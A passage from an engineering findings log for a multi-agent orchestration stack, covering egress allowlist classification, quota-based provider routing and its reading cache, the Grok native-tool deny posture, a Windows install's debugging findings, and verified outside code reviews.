roles mapped to them from the package side, by name. Nobody was told the split; the shape taught
it. The deprecation list is down to `egress-probe`, the frozen design's deliberate probe, which
means retiring the uid machinery now waits on nothing but the decision to delete it.

Also here: the broker's `/health` lists the provisioned profiles beside the map, so the panel shows
both halves of the ownership; and the control count moving 524→515 is the legacy per-role checks
leaving with the roles that left the legacy key — a dynamic count, not a loss.

## 58. A package's runbook, shown where the run starts

The devflow session wrote a runbook for its package and asked for one thing from the stack: read
the `runbook:` manifest key and put the link on the workflow-selection screen — the same
declarative shape as `login:` (§44) and `env:` (§43). A package needing an operating document is
not one package's circumstance, so the key is platform now:

```yaml
# manifest.yaml
runbook: RUNBOOK.md
```

The loader validates it like an entry — a file inside the package, or the declaration is ignored
rather than becoming a link that 404s at the operator. The panel gets the path from the one answer
it already asks for (`workflows --detail`), shows `사용 설명서` beside the workflow's description,
and `GET /api/packages/<name>/runbook` serves the text. The stack reads none of it: what the
document says is the package's, where it is shown is the platform's — the same line as everything
else on that screen.

Measured: devflow's own runbook served through the panel; a package with no declaration answers
404 by name; a declaration pointing outside the package is ignored (driven with `../outside.md`);
519/519 controls, four new. devflow re-pinned at `d50834c`, the commit that carries the document.

## 59. Not a leftover: two consumers of one host name

A note came over from the devflow session: the three GitHub hosts in `docker/egress/allow` are
leftovers, "declared by no package", and the fetch happens on the host so a container needs no route
to GitHub. Half right, and the half that is wrong is the part that would have broken devflow.

**"Declared by no package" was stale.** It was true the day it was written and stopped being true
when devflow declared them (`ce45d51`, the §45 audit). `packages.py egress` today:

```
devflow   github.com            open
devflow   api.github.com        open
devflow   codeload.github.com   open
```

Nothing is unattributed. The §45 orphan report is empty.

**And there are two consumers, not one.** Fetching the *package* is a git clone by
`scripts/packages.sh`, on the host, needing nothing here — that part of the note is right, and §37
is why. Talking to GitHub about a *task* is a different thing entirely: `evaluate`, `integrate`,
`publish` are `type: script` steps, so they run wherever Conductor runs — the main agent — and
`lib/remote.py` streams a tarball from codeload with an error string that points at this very file.
devflow's own runbook lists the entry as required instance setup. Measured:

```
from the main agent (where devflow's script steps run):
  api.github.com 200   codeload.github.com 301   github.com 200
from a profile container (where its model steps run):
  api.github.com 000   codeload.github.com 000        — profiles name no GitHub, correctly
```

So: nothing removed, and the *reason* written where the question arose — a comment in the allowlist
naming both consumers and which one is host-side. A host name in that file is not self-explaining,
and "is this still needed?" is the question it will be asked again.

**What this says about the audit.** §45's report answers "who asked for this host", which is what
caught the nine documentation hosts. It does not answer "from where" — host-side tooling, a main-agent
script step, a profile's model step — and that is the distinction this note tripped on. A `where:`
field on `requires.egress` would encode it; worth building when a second case needs it, not for one.

## 60. The allowlist was instance configuration all along

§59 answered "are these hosts leftovers" with "no, devflow's scripts need them" and stopped there.
The better question came straight back: **then why are a private package's domains in a public
repository?** They were. Six lines in `docker/egress/allow` and seven in each of two profile lists
said what a private workflow talks to — GitHub, a vendor's documentation, three distribution
archives. Nobody leaked anything; the file was simply never classified, while everything around it
was (§42 for packages, §57 for profiles, §51 for instance registration).

**Classified now, the same way as the rest:**

```
docker/egress/allow                tracked    the providers — platform content, every instance
                                              needs exactly these
docker/egress/allow.local          ignored    what THIS instance opened, for the packages it runs
docker/egress/profiles/<n>.allow   ignored    a profile it provisioned (closed and probe ship
                                              tracked, as the shapes to copy)
        ↓  scripts/egress_gen.sh, at every bring-up
config/generated/egress/…          ignored    what the proxies actually mount
```

The proxies read the generated merge, so the tracked file cannot drift into carrying an instance's
decisions — the failure mode that produced this section. The image still bakes a baseline-only copy,
so a container that somehow starts without the mount refuses everything but the providers: a missing
generated file must not mean an open proxy.

**Measured after the switch, every boundary unchanged:**

```
main agent (shared)   api.github.com 200   api.anthropic.com 404   docs.redhat.com 000
research profile      docs.redhat.com 302  api.github.com 000      api.anthropic.com 404
closed profile        api.anthropic.com 404   docs.redhat.com 000
```

And what the public repository now carries is eleven provider hosts, twice, plus `example.com` for
the platform's own probe. Nothing about anyone's workflow.

**A control had to change with it, and the change is the point.** "The market hosts are named, not
a wildcard" (§36) asserted that two specific hosts were *present* in the tracked file — an
instance's configuration, dressed as a platform property, which a fresh clone would fail. It now
asserts what is actually the platform's: the tracked list equals the baseline the code defines, no
list this instance serves names a wildcard, and every rule is anchored at both ends. A control that
asserts a configuration is a control that will be wrong on somebody else's machine.

**Also fixed here**: the `git add -A` that published 38 files out of a stray `C:`-named directory —
a Windows absolute path some tool wrote as a relative one — never reached the remote (the push was
rejected for being behind, and the commit was rebuilt from three files). That shape is git-ignored
now, and nothing deleted what is inside it: it is someone else's, even when it is junk.

**521/521 controls.**

### §60 addendum: the audit followed the file it stopped being

Splitting the allowlist moved what the proxy serves into `config/generated/egress/allow` and left
`packages.py egress` reading the tracked baseline — so the first question asked of it afterwards
("are devflow's three GitHub hosts still open?") came back **NOT OPEN about three hosts that were
open**. An audit that reads the wrong file is worse than no audit: this one would have talked an
operator into removing hosts a package needs. It reads the effective list now, falling back to the
tracked one when nothing is generated yet, and a control pins which file it must be.

Found by being asked to confirm the previous answer, one commit later — which is the argument for
answering "is it done?" with a measurement instead of a memory.

## 61. The router picks one; a round may need several

A review round that requires two model families to both complete held itself on one provider's
quota and never asked about the other. The devflow session traced it and asked whether it is the
stack's. It is, and the shape of the gap is worth naming precisely, because nothing was broken:

* `route.py` answers **which provider should this step take**, evaluated over the candidates the
  profile names. That is the right answer to that question.
* The round's question is different: **are claude and codex both usable**, because a lens is filled
  only when two different families have completed. There was no way to ask it.
* So the workflow asked the only question available, through the profile it had — `long-task`, whose
  candidate list is `['claude']` (measured) — got "claude is at 91%", and held the round. Codex was
  within limits the whole time and was never consulted.

`stack/steps/admit_models.py <profile> <providers>` asks the other question with the same machinery:
the profile's routing policy, its thresholds and windows and logins untouched, with the candidate
list replaced by the providers named — then `router.py` over fresh observations. On the case that
found this:

```
admit_models.py long-task claude,codex
{"all_eligible": false, "eligible": ["codex"], "missing": ["claude"],
 "reason": "claude: exhausted: session 91% >= 80%"}
```

**It decides nothing**, and a control pins that: no HOLD in it, no nonzero exit, no refusal of a run.
Whether a round holds, runs short-handed, or runs anyway is what a round *is*, which is the
workflow's (CONTRACT.md). What the platform owes is the question being askable and the refusal
carrying the router's own words, so a held round can say why in the sentence a person reads.

Worth noting what this does *not* fix: nothing consults it unless a workflow calls it. devflow's
round can hold on a full picture now, and the same step is there for any package whose lane needs
more than one family — `distinct_models` is not a devflow idea, it is what "two independent reviews"
means once reviews are models.

**529/529 controls**, seven new. And a repair on the way: the §60 addendum's control had been spliced
inside a temp-root `try` block, which is how a syntax error reached a suite that had reported passing
— the suite is run after every edit for exactly this reason, and it was.

## 62. A library a package needs: declared, verified, and not installed

Asked whether the platform should work out a package's libraries and install them. Three
measurements decided it before any design did:

```
pydantic, httpx in the agent image        MISSING
PyPI from the governed runtime            no route, by proxy or direct
PyPI from the admin side                  no route, by proxy or direct
```

**No container in this stack can install anything.** The only place a Python dependency can arrive
is the image build, on the host, by the operator — which is where `pytest`, `sympy` and `PyYAML`
already come from. "The platform works it out and installs it" would mean opening PyPI to a
container, and §45–§60 were spent closing exactly that kind of route. Two more reasons not to, even
if the route existed: one shared interpreter means one package's version pin is every package's, and
a pip install runs arbitrary setup code at install time — a much larger grant than the trust §27
describes.

**So the platform does the part that is actually its own**, the §43 shape for a credential applied to
a library. The package declares:

```yaml
requires:
  python: [pydantic, httpx]
```

`packages.py python` answers whether each is importable, and a run whose package lacks one is
refused **at the start**:

```
{"error": "this workflow's package needs a module the runtime has not got: pydantic",
 "why": {"pydantic": "zz-pydep declares it in requires.python"},
 "hint": "no container here can reach PyPI (§62): add it to docker/agent.Dockerfile's venv install
          and re-run scripts/up.sh --build. A pure-Python dependency belongs in the package instead."}
```

Measured with a probe package declaring `pydantic` (absent) and `json` (present): reported
correctly, and the run refused by name rather than dying on an `ImportError` inside a step twenty
minutes in.

**And the first line of the answer is "you probably do not need this".** A pure-Python dependency
belongs *in* the package — a package arrives as a directory, and a step can put a vendored tree on
`sys.path` without the image knowing. The trading harness's own proposal is exactly right on this
point: the harness source travels in the package, and only the two C-extension libraries are the
image's business. `requires.python` is for what cannot travel as a directory, and it stays a
declaration rather than an instruction.

What is *not* built, deliberately: a build hook that reads declarations and adds them to the image.
It is mechanizable and host-side, so the trust boundary survives — but it makes an image's contents a
function of whatever is installed, and the operator who has to trust a package's principals (§27)
should get to see that line too. Worth revisiting when more than one package needs it.

**534/534 controls.**

## 63. Preloop's policy cannot deny a tool it does not name (measured 2026-10-02)

The fail-open default in `policy/b-fsmcp.yaml` — `unknown_tools: allow`, with the file-server's
reads unlisted — was changed to `deny` with every tool named, as the CADP gap analysis
(docs/record/CADP-GAP.md) recommended. The first cold start to carry it failed at `policy apply`,
and `cfg.py status` held the reason:

```
policy stage: RuntimeError: Policy contains restrictive default settings that are not yet supported.
These settings would be silently ignored, leading to permissive behavior.
Unsupported settings: unknown_tools='deny' (only 'allow' is currently supported). Remove these
settings or wait for implementation.
```

Read from the published package (`preloop==0.15.0`, `services/policy/loader.py`): default
settings are not implemented; `deny` and `require_approval` exist in the schema, and the loader
refuses them so that an operator is not left believing something is enforced. `preloop==0.16.0`
carries the same check. So on this Preloop, **a tool the policy does not name is allowed**, and
the only thing that denies is a principal's own tool rules.

What changed as a result: the policy keeps every tool named (so the list is read, not assumed)
and `unknown_tools: allow` with the reason beside it; `scripts/up.sh` now prints Preloop's reason
when an apply fails instead of only "apply failed"; `scripts/verify.sh --level static` refuses a
default Preloop would refuse. The gap stands as recorded — fail-closed classification is not
expressible here — and the place to enforce it remains the principals' rules.

## 64. The second install: Windows, Docker Desktop, Git Bash (measured 2026-10-02)

The stack was brought up on a machine it had never run on — Windows 11, Docker Desktop on WSL2,
Git Bash — from a clone of this branch, by a person running `scripts/verify.sh` at each level and
reporting what failed. Three rounds; every finding was reproduced before it was changed. What was
found, and what each turned out to be:

| | observed | was | change |
|---|---|---|---|
| F1 | `admission: no — no generated profile 'research-default'` on an already-claimed Preloop | `cfg.py generate` ran only in the claim branch of `up.sh` | generated on every bring-up |
| F2 | `exec: "C:/Program Files/Git/opt/venv/bin/python": no such file` | Git Bash rewrote `/opt/…` and `/work/…` arguments to `docker exec`; `up.sh` had the guard, `verify.sh` did not | `MSYS_NO_PATHCONV=1` in `verify.sh` |
| F3 | six static checks failing with the one word `Python` | `python3` on that host is the Microsoft Store's app-execution alias, a stub that prints "Python" and exits 49 | `pick_py()`: the first of `python3`, `python`, `py -3` that runs a script; `PY=` overrides |
| F3 | `UnicodeEncodeError: 'cp949' codec can't encode '\u2014'` in novel's controls | a cp949 console | `PYTHONUTF8=1` |
| F4 | hello-lane's step "did not write where the helper points"; novel's repeat control counted a round | the host's native Python joined a POSIX `/tmp` path with a backslash; the same controls in the agent container: 32 ok | when the stack is up, step tests and package controls run in the agent container, with the runtime's interpreter |
| F5 | `auto completed but the judgement is ''` while the run record said `decision: PASS` | `verify.sh` read the show file with the host Python by its POSIX path; `FileNotFoundError`, swallowed | the show line is piped on stdin |
| F6 | `router_controls` always skipped, "not every provider has a normalized observation in /obs" | there is no such file: every run collects into its own evidence directory, and `/obs` holds only the observer's raw codex reading, read-only in the agent | `verify.sh` collects once, as a run's first step does, and runs the controls on that when all three are eligible |
| F7 | novel-a `HOLD`: `grok: unknown: required weekly window not reported`; `claude: unknown: Claude OAuth usage endpoint is rate limited by Anthropic right now` | not a quota: the second is the vendor's usage endpoint refusing the reading (429, transient; `auto` had routed on claude minutes before); the first is a Grok reading with a timestamp and no window of weekly length, where the first install had measured `weekly 1 %` (FINDINGS-281, "Quota") | the observation now carries `reported_windows` — every window the vendor gave, as given — so the next HOLD says what was reported; the runbook ("Runs hold") says where to read it |
| F8 | profile agents failing at start with symlink "file exists" on a cold start | four containers filling one new named volume at once | `depends_on` the main agent, so one fills it |

What the rounds measured, on `81417d4`: static 10/10, stack 18/18, full 18/20 — the two being
F5 (an auto run that passed, misread) and F7 (a held novel-a). F5 is fixed above. F7's Grok line is
not: the collector now records what Grok reports, and the next reading on that host says whether
the weekly window moved (a plan, CodexBar, or the vendor's response) or stopped being one — the
profile's `require_windows` is the right place to answer that, and the answer is not known yet.

Two readings of F6 differed, and the record should keep both: the report read "the observer
collects only codex" as the cause. It is by design — the observer is codex's optional second
source (§29), and Claude and Grok are read with the login that executes — but the check in
`verify.sh` was written as though the observer produced every provider's normalized file, and so
could never run. The report was right that nothing ran; the reason was the check.

What Grok's window is, read from CodexBar's source at the pinned tag (`v0.63.0`, and unchanged at
its head, 0.70): one `primary` window built from the account's **billing period** — `windowMinutes`
is the period's length, computed from its start and end, so a SuperGrok weekly credit pool
classifies as `weekly` here and a monthly plan would too — and **no window** when the billing
answer carries no percent (CodexBar's own changelog, 0.55.0: "report period-only CLI-proxy
responses as unknown usage instead of 0% when Grok Build has hit its free limit"). So "required
weekly window not reported" with a timestamp is CodexBar seeing the account and the account
giving no usage figure; the next reading's `reported_windows` says which of the two it was, and
the Grok reading on that host — plan, period, percent — is the measurement still owed.

A quota observation from CodexBar has always carried the vendor's labels (`primary`/`secondary`)
re-classified by length into `session`/`weekly`, and nothing else. A classification that fails
silently is the one thing a fail-closed router cannot explain, so the raw list travels with it now.

Linux, the same commits: cold start green, verify stack 18/18 (`cold-start-linux` run 16).

### §64 addendum: the Grok reading, and what the profile now says about it (2026-10-02)

The next run on that host, with the collector carrying `reported_windows`:

```
{"provider": "grok", "source": "codexbar:grok-cli-proxy", "observed_at": "2026-10-02T06:57:36Z",
 "observed_account": "email:1d504a6b18afad1f", "executing_account": "email:1d504a6b18afad1f",
 "identity_basis": "same-credential", "model_route": "direct",
 "windows": {}, "reported_windows": [], "extra_windows": []}
```

The account is seen, the reading is fresh, and the vendor gives no usage figure — the
period-only answer CodexBar classifies as unknown rather than 0 %. `auto` passed on the same
run (F5 confirmed fixed): full 19/20, the one miss being this HOLD.

So `require_windows` takes a per-provider form, and `research-default` says `grok: []` with the
measurement beside it. The router admits such a provider on identity and freshness and writes
*why* into the decision — `within limits (no usage window reported; none required of this
provider)` — so a record never shows a bare "within limits" for a provider that reported nothing.
The list form still binds every candidate; `claude` and `codex` keep `[weekly]`, which both report.
What this is not: a change to the router's rule that unknown is not eligible. A provider the
profile requires a window of, and that reports none, is as unknown as before (control added, with
the four cases).

Owed from that host: the raw billing answer (runbook, "Runs hold"), which says whether this is
the plan or the proxy. Until then the profile's line is the operator's statement, dated.

**Answered the same day (issue #11).** The raw billing answer from the account, through the
egress proxy, with grok 1.0.40 / CodexBar 0.63.0 pinned:

```
config.currentPeriod        {type: USAGE_PERIOD_TYPE_WEEKLY, start: 2026-09-28T16:57:35Z, end: 2026-10-05T16:57:35Z}
config.creditUsagePercent   null
config.onDemandCap          {val: 0}      config.onDemandUsed  {val: 0}      config.prepaidBalance {val: 0}
config.isUnifiedBillingUser true
```

A weekly period and no usage figure: the period-only answer CodexBar classifies as unknown rather
than 0 %, exactly as its source reads. The plan, not the proxy, and not CodexBar. `grok: []`
stands as the account's statement; when the vendor starts carrying a percent for it, the
profile goes back to `[weekly]` and nothing else changes.

### §64 addendum 2: the 429 was ours (measured 2026-10-02)

With `grok: []` in place, novel-a completed on that host — architect=codex, author=claude,
story=codex, history=claude, cold=grok, decision PASS — on a retry. The first attempt had held on
`claude: unknown: Claude OAuth usage endpoint is rate limited by Anthropic right now`, and a live
reading taken by hand minutes later showed the account at 6 % (5 h) / 43 % (weekly), Claude Max 5x.
Not a quota. A rate limit on *asking*.

Who asks, counted from the code rather than guessed: a run's first step (`route.py`, once per
run — `roles.py` reads that decision, it does not collect again); the panel's accounts view
(`/api/accounts`, on load, on every profile change, after a login, and from the dashboard) and
its overview (`/api/overview` → `ops_health` → `unknowable()`); `up.sh --check` (twice:
`unknowable()` and `capabilities.probe()`); `verify.sh` (the same two through `up.sh --check`,
`ops_health`, and now its own collection for the router controls). Each is one live
`codexbar usage --provider claude --source oauth` per login — and nothing kept any reading, so
the profile's `max_age_s: 1800` bounded nothing: there was never a reading to be younger than it.
The report's own count ("route + author + history, 2–3 per run") was not it; the panel was.

What changed (`collect_obs.py`, `kept()`): the last good reading of each provider is kept beside
its login (`/route/.quota/<provider>-<login>.json`); a kept reading younger than 120 s
(`AGENTSTACK_OBS_REUSE_S`) is presented again instead of taken again, with `source: cache:…` and
its own `observed_at`; a live reading that fails, or carries the vendor's error, is answered by the
kept one with the failure beside it (`live_failed`). "Good" is an answer with no error — Grok's
empty figure is a good reading of that. Nothing extends `max_age_s`: the router judges the kept
reading's age as before, so a refusal that outlasts the profile's bound is `stale`, and a provider
that never had a good reading is `unknown` as it always was. Five controls in `review_controls`
drive it with a fake CodexBar: refusal with nothing kept, a good reading kept, refusal answered by
it, the reuse window, the time it keeps.

Full on that host, measured: 20/20 when the endpoint answered. With the keeper, the asking that
tripped it is one live reading per 120 s per login, whatever the panel does.

### §64 addendum 3: the router controls ran for the first time (measured 2026-10-02)

With the keeper in place the second install's `verify.sh --level full` reached 20/21: auto and
novel-a both PASS, and the one failure was `router_controls` — which had never run on any
machine (addendum 1's F6) and now did, because all three providers were eligible. It died before
its first case: `KeyError: 'weekly'` in `set_()`, walking a path into Grok's `windows`, which is
`{}`. Two things were wrong with the cases, and neither was the router. A mutation assumed the
live reading carried the window it was about to set; and the cases ran the router with the
static `stack/routing-policy.json`, which still required a weekly window of every provider while
the profile the stack routes with had stopped requiring one of Grok. Rerun by hand on a
collection shaped like that install's (claude and codex with a weekly window, grok with none):
with the profile's policy 26/26; with the static one 19/26, every miss "→ grok" held on
`grok: unknown: required weekly window not reported` — the exact line the profile change was
for. `router_controls.py` now takes the policy as its second argument, `verify.sh` passes the
generated profile's, a case creates the path it sets, and `routing-policy.json` carries the same
per-provider form as `research-default`.

### §64 addendum 4: the Cold Reader's DENIED — a posture that lived in a hand-written file

Full 21/21 on the second install, novel-a PASS — and in its receipt, `cold grok DENIED` after
335 s, the review itself produced. Read from the call's `result.json`: `mcp_rule_denials: None`,
one permission, `denial: approval_expired`, `acp_kind: edit`, `title: Write /ws/…/review_cold.json`,
and the ACP-handed MCP server connected with `preloop__write_file` in its discovered tools. So
Grok had the governed write and used its native one; the adapter held that for a person, as it
does for every native tool a vendor cannot switch off; nobody was there; the window (~302 s)
expired.

Why the first install never saw this: FINDINGS-281, "Grok native tools removed (2026-09-22)" —
the `[permission]` table (`deny` Bash/Edit/Write/WebFetch/WebSearch, `allow MCPTool(preloop__*)`)
was written **by hand** into `/route/grok/config.toml`, measured (`NATIVE_UNAVAILABLE` when told
to use the built-in write), and entered the matrix as "native write/shell: off (own deny rules)".
Nothing in the tree wrote or checked that file. §31's arm64 pilot had already met the same wall —
a Grok lane asking to run a shell command, held for a person — and recorded the approval clock,
not the missing table. Claude's equivalent is a settings file the adapter writes into each run's
workspace; Codex's is feature flags in its environment; Grok's was a file on one machine.

Built: `stack/grok_posture.py` writes the measured table into every grok login the profiles name
— on login (`login_helper.py`, the moment the status says connected) and on every bring-up
(`up.sh`) — keeping the file's MCP entry, its other tables and any deny/allow entries of its own,
with the previous file beside it; `up.sh --check` reports `grok native tools denied in its config`
for a login that exists and `--` for none. Seven controls in `review_controls` cover a bare login,
an existing file, a second run, and a file that does not parse (left alone, reported).

Measured on the second install after `git pull` and a bring-up (`grok posture: written`;
`up.sh --check`: `grok native tools denied in its config  yes`), `verify.sh --level full`:

```
full: 21/21 passed
novel-a  decision PASS, reviews_failed none, cold_available yes
         story    codex   COMPLETED  produced   41 s
         history  claude  COMPLETED  produced   42 s
         cold     grok    COMPLETED  produced   74 s     (was DENIED at 336 s)
         review_wall_s 73.9                              (was 336.0)
review_cold.json written through preloop__write_file
```

Three vendors, three principals, three governed writes; the fan-out that waited out an approval
window now ends when the slowest reviewer does.

Still a person's decision, deliberately: a native tool a vendor cannot switch off (Codex's
`apply_patch`) is held for approval, and an unattended run that asks for one ends `DENIED` after
the window. The stack does not shorten that window — approval is the answer the stack gives for
a tool outside the posture, and a shorter window would turn "not approved" into "not asked".

## 65. Update day 1 (measured 2026-10-02)

The first run of docs/update-day.md, on the second install (Windows, Docker Desktop), after
`drift.sh` reported eight components newer upstream. What moved, what was held, and what was run
to say it still holds. The decision and the reading behind each pin: docs/record/DECISIONS-2026-10-02.md.

**Moved, one commit each, on the branch:**

| component | from → to | read before moving |
|---|---|---|
| codexbar | 0.63.0 → 0.70.0 | three hardenings of the Claude reading (#4129, #4115/#4083, #4126); Grok billing code identical at both tags |
| claude-code | 2.1.278 → 2.1.287 | 2.1.281–287: no change to project `permissions.deny`; managed settings, headless MCP retries, OAuth messages |
| supergateway | 4.0.0 → 4.1.0 | minor |

**Held** (issue #17): codex 0.160 with codex-acp 2.1.1 and claude-agent-acp 0.85 — both adapters
broke the tool-call contract on 2026-09-28 and the adapter reads that contract; acpx 0.19.4 with
them; Conductor 0.1.41 (+45k lines); grok 1.0.46 (no changelog anywhere).

**Measured.** Linux cold start on the new pins: green (cold-start-linux run 23, f009437), verify
stack 18/18, trial 469/469, review 45/45. On the instance:

```
scripts/release.sh update --to f009437            refused: "claude: running '2.1.278', candidate image
                                                  '2.1.287' — refusing an update whose toolchain would
                                                  silently stay behind — the instance is untouched"
scripts/release.sh update --to f009437 --replace-toolchain
  toolchain  answers; the previous copy was removed
  claude     2.1.287        conductor v0.1.37 · preloop_cli 0.15.0 · codex 0.155.1 · grok 1.0.40
  ALL CHECKS PASSED         (quota knowable 0, router can choose yes, grok native tools denied yes)
  rollback point            20261002-093412-f009437  (claude 2.1.278)
scripts/verify.sh --level full                    21/21 — static 10/10, stack 18/18, full: router_controls
                                                  26/26, auto PASS, novel-a PASS, all three reviewers COMPLETED
claude N7 (one real call on 2.1.287)              auto run 41c0cd80: permissions.jsonl title=mcp__preloop__write_file,
                                                  routed=preloop_mcp_rules, allow_once; events: preloop__write_file ×13,
                                                  native Write/Edit 0
```

The refusal without `--replace-toolchain` is the right one — the toolchain lives in the home
volume, not the image, so an image-only update would have left claude at 2.1.278 while the
record said 2.1.287 — and update-day.md did not mention the flag (issue #20, fixed below).

**The backup was run after, not before.** The procedure's "Before" backup was skipped and taken
once the update had passed (issue #20). Valid as a snapshot of the same data: this round moved no
Preloop version, so no schema migration happened, which is the one thing the backup exists for.

```
archive   ~/agentstack-backups/agentstack-backup-20261002-095538.tar.gz.enc   1.7 GB, 12 members, sha256 each
key       ~/.agentstack-backup.key   64 B, not in the archive — the operator keeps a copy elsewhere
in it     preloop.dump · release.json (f009437) · volumes agent-home, quota-home, route-creds ·
          host mlflow, evidence-p281, evidence-ui-runs, config, policy, preloop-dir, research
```

**A finding on the way** (issue #20): `release.sh record` failed once with `No such image:
sha256:448030c0…` — running containers held an image sha that a rebuild had pruned under them.
`record` runs before anything is touched, so the instance was untouched; `scripts/up.sh
--recreate` put every container on an image that exists, and the update then went through.
`record` should say that is what happened, rather than fail on the daemon's words.

Two more things learned by doing the procedure once: `update` records a rollback point itself,
so the "Before" `record --tag` is a *named* point, not a second one; and the drift report's
"newer" is a reading list, not a to-do — five of eight were held on what the reading said.

## 66. Six issues in one pass, measured on cold-start-linux run 26 (2026-10-02)

After update day 1 the remaining stack work (DECISIONS-2026-10-02.md, issues #12 #13 #15 #16
#20) went into one branch, one commit per issue, one CI run. e7fc354: cold start green, verify
stack **19/19**, trial_controls **470/470**, review_controls **58/58**, novel 32/32.

**#15 declared, not assumed.** A profile that runs grok with `tools.native_tools: true` is
refused by `cfg.py` with the reason (Grok's posture is per login, §64 addendum 4). The collector's
reuse window is the profile's `quota.reuse_s` (default 120, below `max_age_s`, generated into the
routing policy, passed by every caller). A provider nobody has read says "sign in on the panel;
the quota observer is not it" — the old line sent the second install's reader to the observer.

**#20 release.sh.** `record` names a container whose image a rebuild pruned and the way out
(`up.sh --recreate`); `update` says whether a backup exists and how old, records it in
`release.kv`, and does not refuse.

**#13 a child run and a wait, measured.** `stack/cases/child-run.yaml` (a built-in: hello-lane as
a `type: workflow` step, a 1 s `type: wait`, a step that reports both run ids) ran at the stack
level:

```
child-run: the child step saw run id '5ed2fd86' - the parent is '5ed2fd86' (same_run: yes, waited 1.001 s)
```

A Conductor sub-workflow is the same run with a nested graph — same id, workspace, evidence
namespace, record. It composes graphs; it is not a run of its own. devflow's `drive.py`, which
starts child runs through `run_workflow.py start`, was right; what the stack owes is the record
link (`--suite`/`--case` carried from a step). docs/packages.md says so now, from the measurement
rather than from the engine's documentation, which was the point. `cycle.py` carries `key=value`
inputs to the run (the matrix's §4 stack defect).

**#12 the contract's second half.** CONTRACT.md: the platform implements what is common and makes
the place for what is specific, with the table of places. `step.bind_file/bind_text/bound` is the
binding four packages had each written; novel's triage uses it and its 32 controls pass unchanged.

**#16 composition.** `toolsvc` (the #278 marker tool server; nothing called it) is gone from the
composition, the policy and the Dockerfile; the quota observer is the compose profile `observer`
(`up.sh --observer`, kept once its volume exists). The cold start now brings up fifteen agentstack
containers instead of seventeen, and the policy scans one tool server. An instance brought up
before this keeps `agentstack-toolsvc` registered in its Preloop account until an apply prunes
it; no tool of it is in the policy, so nothing reaches it.

## 67. An outside review, verified before the merge (2026-10-02)

Before PR #21 was merged an external review of the branch arrived: scores, a table of "confirmed
defects", and recommendations. Each claim was checked against the code on the branch rather than
taken on its word. What held, and what was done about it:

| claim | verified | done |
|---|---|---|
| a fan-out member whose process cannot start leaves its row without an end; the step reading the rows dies for every member | **yes** — `run_all` with `/nonexistent/x` beside `true`: the failed row had `argv, key, started_at` and nothing else | `fanout.py` catches the start failure: the row gets `ended_at`, returncode 127, the reason in stderr, `start_failed` |
| a retry replaces the first attempt's result; its call and its evidence directory leave the receipt and the record counts one call where two were made | **yes** — `by_label[label] = r` overwrote; `run_id` was the same, so the second attempt wrote into the first's evidence directory | every attempt's result is kept (`attempt_results`); the attempt number travels to the call (`AGENTSTACK_ATTEMPT`), which names its evidence `-a<n>`; `model_calls` counts attempts; trajectory counts fan-out retries |
| the panel shows "no approvals waiting" when the approvals API could not be read | **yes** — `showWaiting(0)` on any non-list | "could not read" is its own state: a `?` badge, a red line with the reason |
| the 15 s refresh rebuilds the approvals table and loses a reason being typed | **yes** | typed values and focus are kept across the rebuild |
| the first example (hello-lane, no model call) cannot be started from the panel without a routed provider | **yes** — the start gate was `valid && ROUTE` for every workflow | the gate reads the workflow's `capabilities` (now in `/api/workflows`): HOLD blocks only a workflow that asks for `admission` |
| the usage header says "remaining" over a column that shows used % | **yes** | header reads 사용량 |
| the manifest example in docs/packages.md has `requires:` twice | **yes** (YAML keeps the second: `capabilities` vanished from the example) | merged |
| CONTRACT's "what belongs on a screen" puts starting a run and applying configuration on the command side; the panel does both | **yes** | not a code fix: #24, the operator decides whether the rule or the panel changes |
| execution facts should be collected by the platform, not listed by the step | design — agreed in principle (CONTRACT, common parts are the stack's) | #22 |
| the step/request/result contract should carry a version and its documented examples should be tested | design — the duplicate `requires:` is the evidence | #23 |
| a package that brings its own runtime (trading) has no extension contract | design — follows #18 and the trading author's answer | #25 |
| a new author's first success should be measured, not assumed | design — the hello-lane gate is the evidence | #26 |

Six controls were added for the two step defects (`review_controls.py`: a member that cannot
start, the member beside it, env reaching the process; a retried member end to end through
`tasks.py` with a fake chain that fails on attempt 1 and produces on attempt 2 — both attempts
in the receipt, the retry named apart, two calls reported). The old `fanout.py` fails the first
of them; review_controls 64/64, static 10/10.

What the review scored and this record does not: a score is a reviewer's summary; the rows above
are what was measured.

## 68. The connective tissue, read as code: five signs, verified, three of them cut (2026-10-02)

A second outside reading — of the structure this time, not the behaviour — said the big
boundary (platform / workflow) holds and the *connections* between execution, state and record
had grown rules nobody owns. Its criterion was the right one: not how long a file is, but how
many other places one has to know to change one thing. Each sign was checked on `main@f114ce9`
before anything moved:

| sign | verified | done |
|---|---|---|
| step names are an API: the screen read a step *named* `route` and steps whose names start with `record` | **yes** — `run_workflow.py` 487 and 496 | `stack/runevents.py` reads the event log and recognises the router and the recorder by what they *answered* (`decision`+`evaluated`+`provider`; `mlflow_run_id`), under any name. A step named `route` that did not route is not read as the router (control) |
| the view writes: `view()` built the screen's answer and repaired `meta.json` on the way | **yes** — 513–525 | `stack/runstate.py` owns the run's state; `recover()` is the one explicit restoration and `run_workflow.read()` calls it by name; `view()` writes nothing (control: a view leaves meta untouched; read persists) |
| the door is chosen in three places: `agent_task.py`, `tasks.py` and `task_chain.py` each decided broker-or-local | **yes** — agent_task 56, tasks 98, task_chain 44 | the fan-out and a chain start `agent_task.py` and never choose; the swap lives where the call is made, once |
| results are re-packed by hand along `agent_task → receipt → record → trajectory`, so a field could vanish mid-way (which is how §67's lost attempt happened) | **yes** | `stack/execution.py`: one record (`FIELDS`, `contract: 1`), `record()`/`normalize()`/`problems()`, `of_member()` for what a receipt member made; `agent_task.py` writes it to stdout *and* `<evidence_dir>/execution.json`; the receipt keeps every attempt in it; the recorder counts executions through it (every attempt, every chain step); the trajectory reads the platform's copy first. A control holds docs/packages.md's `output:` list equal to `FIELDS` |
| the router is asked in three moves by six callers (route step, admit_models, capabilities, ops_health, ops API, verify.sh), each with its own copy of the moves | **yes** — the reuse window had reached five of six | `stack/admission.py`: `evaluate(profile | policy, candidates, evidence_dir)`; the six ask it. A collector that fails is reported (`collect_error`) and the router says "unknown", never a crash in the step |
| `run-agent.mjs` carries provider config, principal auth, approvals, ACP, ledger and result storage in one file | **yes** (497 lines, module-level `LOGIN`/`PRINCIPAL`) | not here: it runs only with a model call, which no stack-level check makes. #27, with the fixture to take before cutting |

What did not move: `cfg.py` (long, and one thing), the package/platform boundary itself, and
`run_workflow.py`'s commands — it still starts, stops, resumes and answers, 616 → 525 lines,
with the reading and the state elsewhere. Nothing a package calls changed: `agent_task.py`'s
argv and output keys, the receipt's keys, the record step's payload, `run_workflow.py`'s
